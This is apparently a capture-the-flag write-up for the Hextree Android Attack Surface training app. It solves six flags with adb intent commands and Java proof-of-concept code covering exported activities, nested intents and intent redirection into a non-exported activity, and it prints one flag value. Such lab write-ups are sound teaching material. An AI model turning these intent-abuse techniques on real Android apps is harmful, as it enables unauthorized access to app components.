---
title: Hextree Android Attack Surface Write up
date: 2026-02-11
categories: [Android, Android_Security]
tags: [Android, HexTree]
layout: post
permalink: /hextree/AndroidAttackSurface/
---

![hextree](/assets/img/AndroidAttackSurface/image%20.png)

## Tips

### Use logcat

* Since all flags are logged once you get them, the easiest way to retrieve flags is simply by monitoring **logcat** and copying the value directly.

```bash
adb logcat --pid=$(adb shell pidof io.hextree.attacksurface)
````

### Proof of Concept (PoC)

To build a PoC:

* Use **Android Studio**
* Create a **single Activity**
* Add **one Button or TextView**
* Execute the Java PoC logic inside its click handler
* Make sure your package Name contains "Hextree" 



#### Example XML Layout File for PoC

```xml
<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity">

    <TextView
        android:id="@+id/main_text"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Find the Flag"
        app:layout_constraintTop_toTopOf="parent"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintEnd_toEndOf="parent" />

</androidx.constraintlayout.widget.ConstraintLayout>
```

#### Example Java File for PoC

```java
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    TextView text = findViewById(R.id.main_text);
    text.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View v) {

            // Put PoC logic here

        }
    });
}
```

## Activity

### 🏳️ Flag 1 - Basic exported activity

* In `AndroidManifest.xml` notice the activity is exported:

```bash
<activity
    android:name="io.hextree.attacksurface.activities.Flag1Activity"
    android:exported="true"/>
```

* Call it using adb:

```bash
adb shell am start-activity -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag1Activity
```

* **Explanation:** This activity is simply exported and does not require any extra intent parameters. Launching it directly triggers the flag.

---

### 🏳️ Flag 2 - Intent with extras

* In `AndroidManifest.xml` notice the activity is exported:

```bash
<activity
    android:name="io.hextree.attacksurface.activities.Flag2Activity"
    android:exported="true">
     <intent-filter>
          <action android:name="io.hextree.action.GIVE_FLAG"/>
     </intent-filter>
 </activity>
```

* Notice the intent requires the action string to work:

```bash
String action = getIntent().getAction();
if (action == null || !action.equals("io.hextree.action.GIVE_FLAG")) {
    return;
}
this.f.addTag(action);
success(this);
```

* Using adb:

```bash
adb shell am start-activity \
  -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag2Activity \
  -a io.hextree.action.GIVE_FLAG
```

* **Explanation:** This activity only grants the flag if the intent contains a specific `action` string. Using `-a io.hextree.action.GIVE_FLAG` ensures we satisfy this condition.

---

### 🏳️ Flag 3 - Intent with a data URI

* In `AndroidManifest.xml` notice the activity is exported:

```bash
<activity
    android:name="io.hextree.attacksurface.activities.Flag3Activity"
    android:exported="true">
    <intent-filter>
        <action android:name="io.hextree.action.GIVE_FLAG"/>
        <data android:scheme="https"/>
    </intent-filter>
</activity>
```

* Notice the logic and requirments of the intent :

```bash
Intent intent = getIntent();
String action = intent.getAction();
if (action == null || !action.equals("io.hextree.action.GIVE_FLAG")) {
    return;
}
this.f.addTag(action);
Uri data = intent.getData();
if (data == null || !data.toString().equals("https://app.hextree.io/map/android")) {
    return;
}
this.f.addTag(data);
success(this);
```

* Using adb:

```bash
adb shell am start-activity \
  -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag3Activity \
  -a io.hextree.action.GIVE_FLAG \
  -d https://app.hextree.io/map/android
```

* **Explanation:** This activity requires both an `action` and a **specific data URI**. The `-d` option passes the URI. Only when both match does the activity add the tag and trigger the flag.

---

### 🏳️ Flag 4 - State machine

* In `AndroidManifest.xml` notice the activity is exported:

```bash
<activity
    android:name="io.hextree.attacksurface.activities.Flag4Activity"
    android:exported="true"/>
```

* Flag4 activity logic:

```bash
public Flag4Activity() {
    this.name = "Flag 4 - State machine";
    this.flag = "2ftukoQ59QLkG42FGkCkdyK7+Jwi0uY7QfC2sPyofRcgvI+kzSIwqP0vMJ9fCbRn";
}

public enum State {
    INIT(0),
    PREPARE(1),
    BUILD(2),
    GET_FLAG(3),
    REVERT(4);

    private final int value;

    State(int i) {
        this.value = i;
    }

    public int getValue() {
        return this.value;
    }

    public static State fromInt(int i) {
        for (State state : values()) {
            if (state.getValue() == i) {
                return state;
            }
        }
        return INIT;
    }
}
```

* State machine logic:

```bash
public void stateMachine(Intent intent) {
    String action = intent.getAction();
    int iOrdinal = getCurrentState().ordinal();
    if (iOrdinal != 0) {
        if (iOrdinal != 1) {
            if (iOrdinal != 2) {
                if (iOrdinal == 3) {
                    this.f.addTag(State.GET_FLAG);
                    setCurrentState(State.INIT);
                    success(this);
                    Log.i("Flag4StateMachine", "solved");
                    return;
                }
                if (iOrdinal == 4 && "INIT_ACTION".equals(action)) {
                    setCurrentState(State.INIT);
                    Toast.makeText(this, "Transitioned from REVERT to INIT", 0).show();
                    Log.i("Flag4StateMachine", "Transitioned from REVERT to INIT");
                    return;
                }
            } else if ("GET_FLAG_ACTION".equals(action)) {
                setCurrentState(State.GET_FLAG);
                Toast.makeText(this, "Transitioned from BUILD to GET_FLAG", 0).show();
                Log.i("Flag4StateMachine", "Transitioned from BUILD to GET_FLAG");
                return;
            }
        } else if ("BUILD_ACTION".equals(action)) {
            setCurrentState(State.BUILD);
            Toast.makeText(this, "Transitioned from PREPARE to BUILD", 0).show();
            Log.i("Flag4StateMachine", "Transitioned from PREPARE to BUILD");
            return;
        }
    } else if ("PREPARE_ACTION".equals(action)) {
        setCurrentState(State.PREPARE);
        Toast.makeText(this, "Transitioned from INIT to PREPARE", 0).show();
        Log.i("Flag4StateMachine", "Transitioned from INIT to PREPARE");
        return;
    }
    Toast.makeText(this, "Unknown state. Transitioned to INIT", 0).show();
    Log.i("Flag4StateMachine", "Unknown state. Transitioned to INIT");
    setCurrentState(State.INIT);
}
```

* Use adb to trigger state transitions:

* INIT → PREPARE

```bash
adb shell am start-activity \
  -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag4Activity \
  -a PREPARE_ACTION
```

* PREPARE → BUILD

```bash
adb shell am start-activity \
  -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag4Activity \
  -a BUILD_ACTION
```

* BUILD → GET_FLAG

```bash
adb shell am start-activity \
  -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag4Activity \
  -a GET_FLAG_ACTION
```

* GET_FLAG → SUCCESS

*(action doesn’t matter here)*

```bash
adb shell am start-activity \
  -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag4Activity
```

* This call hits:

```bash
if (iOrdinal == 3) {
    success(this);
}
```

* **Explanation:** Flag4 uses a **state machine**. Each action moves the internal state forward:

  1. `PREPARE_ACTION` → moves from INIT → PREPARE
  2. `BUILD_ACTION` → moves from PREPARE → BUILD
  3. `GET_FLAG_ACTION` → moves from BUILD → GET_FLAG
  4. Final call triggers the flag when in GET_FLAG state.

  Without following the correct sequence, the flag won’t be granted.

---

### 🏳️ Flag 5 – Intent in Intent

* In `AndroidManifest.xml` notice the activity is exported.

```bash
<activity
    android:name="io.hextree.attacksurface.activities.Flag5Activity"
    android:exported="true"/>
```

* Notice the logic: it uses **nested intent** handling.

```bash
Intent intent = getIntent();
Intent intent2 = (Intent) intent.getParcelableExtra("android.intent.extra.INTENT");
if (intent2 == null || intent2.getIntExtra("return", -1) != 42) {
    return;
}
this.f.addTag(42);

Intent intent3 = (Intent) intent2.getParcelableExtra("nextIntent");
this.nextIntent = intent3;
if (intent3 == null || intent3.getStringExtra("reason") == null) {
    return;
}
this.f.addTag("nextIntent");

if (this.nextIntent.getStringExtra("reason").equals("back")) {
    this.f.addTag(this.nextIntent.getStringExtra("reason"));
    success(this);
} else if (this.nextIntent.getStringExtra("reason").equals("next")) {
    intent.replaceExtras(new Bundle());
    startActivity(this.nextIntent);
}
```

* Structure of the nested intent

```bash
Outer Intent
 └── "android.intent.extra.INTENT" → Intent A
       ├── "return" = 42
       └── "nextIntent" → Intent B
             └── "reason" = "back"
```

* Since `adb` commands do not support nested intents, a PoC is created using **Android Studio**.

```bash
public void onClick(View v) {
    Intent nextIntent = new Intent();
    nextIntent.putExtra("reason", "back");

    Intent innerIntent = new Intent();
    innerIntent.putExtra("return", 42);
    innerIntent.putExtra("nextIntent", nextIntent);

    Intent outerIntent = new Intent();
    outerIntent.setClassName(
            "io.hextree.attacksurface",
            "io.hextree.attacksurface.activities.Flag5Activity"
    );
    outerIntent.putExtra(Intent.EXTRA_INTENT, innerIntent);
    startActivity(outerIntent);
}
```
---

### 🏳️ Flag 6 - Not exported ( Intent Redirection )

* In AndroidManifest.xml notice activity is **not exported** .

```bash
<activity
    android:name="io.hextree.attacksurface.activities.Flag6Activity"
    android:exported="false"/>
```

* Notice activity logic :

```bash
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.f = new LogHelper(this);
        if ((getIntent().getFlags() & 1) != 0) {
            this.f.addTag("FLAG_GRANT_READ_URI_PERMISSION");
            success(this);
        }
    }
```

* Check again Flag 5 logic and notice , we can use this to **launches an attacker-controlled Intent** if the extra `reason` equals `"next"`, resulting in **Intent Redirection**.

```bash
else if (this.nextIntent.getStringExtra("reason").equals("next")) {
    intent.replaceExtras(new Bundle());
    startActivity(this.nextIntent);    // dangerous logic
```

* Since activity isn’t exported we need to abuse the class in Flag 5 activity to call Flag 6 activity from inside the same app .

```bash
 public void onClick(View v) {
                Intent nextIntent = new Intent();
                nextIntent.putExtra("reason", "next");
                nextIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                nextIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag6Activity");

                Intent innerIntent = new Intent();
                innerIntent.putExtra("return", 42);
                innerIntent.putExtra("nextIntent", nextIntent);

                Intent outerIntent = new Intent();
                outerIntent.setClassName(
                        "io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag5Activity"
                );
                outerIntent.putExtra(Intent.EXTRA_INTENT, innerIntent);
                startActivity(outerIntent);
        }});
```